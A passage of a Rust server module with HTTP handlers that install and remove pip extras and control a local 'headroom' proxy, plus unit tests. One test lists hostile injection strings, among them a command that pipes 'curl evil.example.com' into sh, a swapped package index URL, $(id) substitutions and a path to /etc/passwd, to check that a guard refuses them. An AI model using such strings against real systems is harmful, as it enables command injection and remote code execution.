                    available: HEADROOM_COMPRESSION_EXTRAS,
                    output: control::tail_of(&output),
                    extras,
                },
            )
        }
        Err(error) => responses::json(
            error.status(),
            &InstallFailed {
                success: false,
                code: control::code_for(&error),
                error: error.to_string(),
                spec,
                requested,
                ignored,
                available: HEADROOM_COMPRESSION_EXTRAS,
            },
        ),
    }
}

/// `DELETE /api/headroom/extras` — remove the marker packages an extra pulled in.
///
/// Upstream exposes `uninstallHeadroomExtras`, and without it an operator who installed `ml` by
/// mistake has a multi-gigabyte dependency and no way to undo it from the panel.
async fn uninstall_extras(body: web::Bytes) -> HttpResponse {
    let parsed = match json_body::parse_optional::<Value>(&body) {
        Ok(parsed) => parsed,
        Err(response) => return response,
    };
    let (requested, ignored) = requested_extras(parsed.as_ref());

    // The packages come from this repository's own marker table, keyed by an extra name that had
    // to be in the closed list to get here. A request name never becomes a package name.
    let packages = marker_packages(&requested);
    if packages.is_empty() {
        return responses::json(
            StatusCode::BAD_REQUEST,
            &InstallFailed {
                success: false,
                code: "NO_EXTRAS",
                error: "name at least one of the available extras to remove".to_owned(),
                spec: String::new(),
                requested,
                ignored,
                available: HEADROOM_COMPRESSION_EXTRAS,
            },
        );
    }

    match control::pip_uninstall(&packages).await {
        Ok(output) => responses::json(
            StatusCode::OK,
            &InstallResult {
                success: true,
                spec: packages.join(" "),
                requested,
                ignored,
                available: HEADROOM_COMPRESSION_EXTRAS,
                output: control::tail_of(&output),
                extras: actix_web::rt::task::spawn_blocking(detect)
                    .await
                    .map(ExtrasReport::from)
                    .ok(),
            },
        ),
        Err(error) => responses::json(
            error.status(),
            &InstallFailed {
                success: false,
                code: control::code_for(&error),
                error: error.to_string(),
                spec: packages.join(" "),
                requested,
                ignored,
                available: HEADROOM_COMPRESSION_EXTRAS,
            },
        ),
    }
}

/// `POST /api/headroom/start` — bring the proxy up.
async fn start() -> HttpResponse {
    let url = configured_headroom_url();
    match loopback_port(&url) {
        Err(response) => response,
        Ok(port) => run_start(port, url).await,
    }
}

/// `POST /api/headroom/restart` — stop then start.
///
/// Sequenced rather than issued as one command because the supervisor's own replacement is what
/// makes it atomic: a start stops whatever is running first, so this exists to report the stop
/// separately, which is what the panel shows while it waits.
async fn restart() -> HttpResponse {
    let url = configured_headroom_url();
    let port = match loopback_port(&url) {
        Err(response) => return response,
        Ok(port) => port,
    };
    let stopped = control::stop().await;
    tracing::info!(?stopped, "headroom proxy stopped for restart");
    run_start(port, url).await
}

/// `POST /api/headroom/stop` — take the proxy down. Idempotent.
async fn stop() -> HttpResponse {
    let outcome = control::stop().await;
    responses::json(
        StatusCode::OK,
        &ProcessResult {
            success: true,
            running: false,
            state: "stopped",
            pid: None,
            url: configured_headroom_url(),
            port: None,
            message: format!("headroom proxy stopped ({outcome:?})"),
            logs: Vec::new(),
        },
    )
}

/// The port to run on, or the refusal for a proxy that is not this machine's.
///
/// The loopback check keeps its upstream meaning and its upstream status: a proxy on another host
/// is not ours to start, stop or restart, and that is a `400` there and here.
fn loopback_port(url: &str) -> Result<u16, HttpResponse> {
    if is_loopback_headroom_url(url) {
        return Ok(url_port(url).unwrap_or(DEFAULT_HEADROOM_PORT));
    }
    Err(responses::json(
        StatusCode::BAD_REQUEST,
        &ExternalProxyRefused {
            success: false,
            error: EXTERNAL_PROXY,
            code: "EXTERNAL_PROXY",
            url: url.to_owned(),
        },
    ))
}

/// Start the daemon and render the outcome.
async fn run_start(port: u16, url: String) -> HttpResponse {
    let options = control::DaemonOptions {
        port,
        code_aware: configured_code_aware(),
        kompress: configured_kompress(),
    };

    match control::start(options).await {
        Ok(snapshot) => responses::json(
            StatusCode::OK,
            &ProcessResult {
                success: true,
                running: snapshot.is_running(),
                state: snapshot.state.as_str(),
                pid: snapshot.pid,
                url,
                port: Some(port),
                message: format!("headroom proxy is listening on port {port}"),
                logs: snapshot.logs,
            },
        ),
        Err(error) => {
            let snapshot = control::snapshot();
            responses::json(
                error.status(),
                &ProcessFailed {
                    success: false,
                    code: control::code_for(&error),
                    error: error.to_string(),
                    url,
                    port: Some(port),
                    state: snapshot.state.as_str(),
                    logs: snapshot.logs,
                },
            )
        }
    }
}

async fn proxy(path: web::Path<String>) -> HttpResponse {
    responses::json(
        StatusCode::NOT_IMPLEMENTED,
        &ProxyUnsupported {
            success: false,
            unsupported: true,
            path: path.into_inner(),
            message: "Headroom proxy forwarding is not supported by nullrouter-api",
        },
    )
}

#[cfg(test)]
mod tests {
    /// The second layer, checked on its own.
    ///
    /// `requested_extras` filters names against `HEADROOM_COMPRESSION_EXTRAS` before
    /// `install_spec` sees them, so in practice nothing hostile reaches the requirement. That
    /// makes the charset in `nullrouter-procctl` unexercised by the route — and an unexercised
    /// guard is one that can rot without anything failing. This asserts it directly: if the
    /// filter were ever bypassed, the requirement would still be refused rather than executed.
    #[test]
    fn a_requirement_built_from_an_unfiltered_name_is_refused_by_the_charset() {
        use nullrouter_procctl::argv::Argv;

        for hostile in [
            "ml];curl evil.example.com|sh;[",
            "ml --index-url=https://evil.example.com",
            "ml`id`",
            "ml$(id)",
            "../../etc/passwd",
        ] {
            // Deliberately skipping `requested_extras`, which is the layer being bypassed.
            let spec = super::install_spec(&[hostile.to_owned()]);

            assert!(
                Argv::new().requirement("requirement", &spec).is_err(),
                "{spec:?} would have been passed to pip"
            );
        }

        // And the requirements this module really builds are all accepted, so the guard is not
        // simply refusing everything.
        for accepted in [
            vec![],
            vec!["code".to_owned()],
            vec!["code".to_owned(), "ml".to_owned()],
        ] {
            let spec = super::install_spec(&accepted);
            assert!(
                Argv::new().requirement("requirement", &spec).is_ok(),
                "{spec:?} was refused"
            );
        }
    }

    use super::{
        install_spec, is_loopback_headroom_url, normalise_dist, parse_python_version,
        requested_extras, url_host, url_port, version_is_supported,
    };
    use serde_json::json;

    #[test]
    fn parses_the_version_python_actually_prints() {
        assert_eq!(parse_python_version("Python 3.12.4\n"), Some((3, 12)));
        assert_eq!(parse_python_version("Python 3.10.0rc1"), Some((3, 10)));
        // A future major must not be truncated to its minor.
        assert_eq!(parse_python_version("Python 4.0.1"), Some((4, 0)));
    }

    #[test]
    fn unparseable_version_output_is_not_a_version() {
        // Each of these must be `None`, never a defaulted `(0, 0)` that would
        // read as "an interpreter answered, and it is too old".
        for output in ["", "Python", "python: command not found", "Python three"] {
            assert_eq!(parse_python_version(output), None, "{output:?}");
        }
    }

    #[test]
    fn version_gate_matches_the_headroom_requirement() {
        assert!(!version_is_supported((3, 9)));
        assert!(version_is_supported((3, 10)));
        assert!(version_is_supported((3, 13)));
        assert!(version_is_supported((4, 0)));
        assert!(!version_is_supported((2, 7)));
    }

    #[test]
    fn distribution_names_compare_by_pep503_form() {
        assert_eq!(normalise_dist("huggingface_hub"), "huggingface-hub");
        assert_eq!(
            normalise_dist("Tree_Sitter.Language--Pack"),
            "tree-sitter-language-pack"
        );
        assert_eq!(normalise_dist("  headroom-ai "), "headroom-ai");
    }

    #[test]
    fn extracts_host_and_port_from_the_urls_headroom_uses() {
        assert_eq!(url_host("http://localhost:8787"), Some("localhost"));
        assert_eq!(url_port("http://localhost:8787"), Some(8787));
        assert_eq!(url_host("http://127.0.0.1:8787/health"), Some("127.0.0.1"));
        assert_eq!(url_host("http://[::1]:8787"), Some("::1"));
        assert_eq!(url_port("http://[::1]:8787"), Some(8787));
        // No explicit port: the caller falls back to the default rather than
        // inventing one from the scheme.
        assert_eq!(url_port("http://localhost"), None);
        assert_eq!(url_port("http://[::1]"), None);
        // Userinfo is not a host.
        assert_eq!(url_host("http://user:pw@127.0.0.1:9000"), Some("127.0.0.1"));
        assert_eq!(url_port("http://user:pw@127.0.0.1:9000"), Some(9000));
    }

    #[test]
    fn a_url_without_a_scheme_has_no_host() {
        // Upstream's `new URL(...)` throws on these and its catch returns false,
        // so they must not be read as bare hostnames.
        for url in ["localhost:8787", "127.0.0.1", "", "://x"] {
            assert_eq!(url_host(url), None, "{url:?}");
            assert!(!is_loopback_headroom_url(url), "{url:?}");
        }
    }

    #[test]
    fn loopback_check_accepts_only_local_hosts() {
        for url in [
            "http://localhost:8787",
            "http://127.0.0.1:8787",
            "http://[::1]:8787",
            "http://0.0.0.0:8787",
            "https://LOCALHOST:8787",
        ] {
            assert!(is_loopback_headroom_url(url), "{url:?}");
        }
        for url in [
            "http://headroom.internal:8787",
            "http://192.168.1.20:8787",
            "https://example.test",
        ] {
            assert!(!is_loopback_headroom_url(url), "{url:?}");
        }
    }

    #[test]
    fn only_known_extras_are_accepted() {
        let body = json!({ "extras": ["code", "image", "ml", 7, null] });
        let (accepted, ignored) = requested_extras(Some(&body));
        assert_eq!(accepted, vec!["code", "ml"]);
        // A name this build does not know is reported back, not silently
        // swallowed, so the panel can say it was not recognised.
        assert_eq!(ignored, vec!["image"]);
    }

    #[test]
    fn a_body_without_an_extras_array_requests_nothing() {
        for body in [
            json!({}),
            json!({ "extras": null }),
            json!({ "extras": "ml" }),
        ] {
            let (accepted, ignored) = requested_extras(Some(&body));
            assert!(accepted.is_empty(), "{body}");
            assert!(ignored.is_empty(), "{body}");
        }
        let (accepted, ignored) = requested_extras(None);
        assert!(accepted.is_empty());
        assert!(ignored.is_empty());
    }

    #[test]
    fn the_reported_spec_always_carries_the_proxy_base() {
        assert_eq!(install_spec(&[]), "headroom-ai[proxy]");
        assert_eq!(
            install_spec(&[String::from("code"), String::from("ml")]),
            "headroom-ai[proxy,code,ml]"
        );
    }
}
